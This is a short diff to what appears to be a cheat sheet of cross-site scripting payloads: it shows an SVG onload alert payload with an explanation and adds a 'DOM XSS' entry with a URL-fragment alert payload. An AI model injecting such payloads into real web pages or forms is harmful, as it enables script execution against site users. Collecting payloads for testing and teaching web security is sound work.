@@ -26,3 +26,7 @@ This payload attempts to execute JavaScript code when the onerror event is trigg
 
 <svg/onload=alert('XSS')>
 This payload tries to execute JavaScript code when the SVG image is loaded.
+
+
+## DOM XSS 
+http://example.com/page.html#alert('XSS')
